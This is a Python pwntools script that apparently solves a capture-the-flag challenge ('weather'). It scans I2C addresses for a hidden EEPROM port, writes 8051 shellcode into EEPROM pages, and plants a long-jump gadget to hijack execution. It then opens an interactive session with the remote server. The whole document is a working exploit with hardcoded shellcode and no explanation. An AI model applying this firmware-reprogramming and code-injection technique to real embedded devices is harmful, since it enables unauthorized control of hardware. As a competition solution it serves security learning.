from pwn import *
t = remote('weather.2022.ctfcompetition.com', 1337)
context.log_level = 'error'

def read_from_addr(addr, len):
	t.recvuntil(b'? ')
	t.sendline(f'r {addr} {len}'.encode())
	t.recvuntil(b'i2c status: ')
	status = t.recvline().strip()
	ret_data = t.recvuntil(b'\n-end\n', drop = True).decode().strip().split()
	return status, ret_data

def write_to_addr(addr, data):
	t.recvuntil(b'? ')
	t.sendline(f'w {addr} {len(data)} {" ".join([str(x) for x in data])}'.encode())
	t.recvuntil(b'i2c status: ')
	status = t.recvline().strip()
	return status

eeprom_i2c_addr = '10100000033'
def discover_hidden_port():
	# the hidden port is 33
	for i in range(128):
		status, data = read_from_addr(f'101000000{i}', 128)
		# if transaction is done properly, msg: transaction completed / ready
		if status != b'error - device not found':
			print(f'Device exists on address {i}')

def reprogram_eeprom(page, data):
	if len(data) < 64:
		data += (64 - len(data)) * b'\x00'
	data = [(x ^ 0xff) for x in data]
	status = write_to_addr(eeprom_i2c_addr, [page] + [0xa5, 0x5a, 0xa5, 0x5a] + data)
	print(f'{status=}')

def check_reprogram(page):
	# read them back to check
	write_to_addr(eeprom_i2c_addr, [page])
	status, data = read_from_addr(eeprom_i2c_addr, 64)
	data_1 = bytes([int(a) for a in data])
	print(f'{shellcode = }')
	print(f'{data_1    = }')

def exploit():
	# ./sdcc shellcode.c
	shellcode = '7E 00 7F 00 8E EE E5 F3 60 FC 85 EF F2 0E BE 00 01 0F C3 EF 64 80 94 81 40 EA 90 00 00 22'
	shellcode = 8 * b'\x00' + bytes.fromhex(shellcode)
	reprogram_eeprom(40, shellcode)

	# scan eeprom.bin for suitable bytes
	jump_offset = 0x4b1
	page = jump_offset // 0x40
	offset = jump_offset %	0x40
	jmp_gadget = b'\x02\x0a\x00' # ljmp 0xa00
	data = b'\x00' * offset + jmp_gadget
	reprogram_eeprom(page, data)

	t.sendline(b'r 0')
	t.interactive()

if __name__ == '__main__':
	exploit()
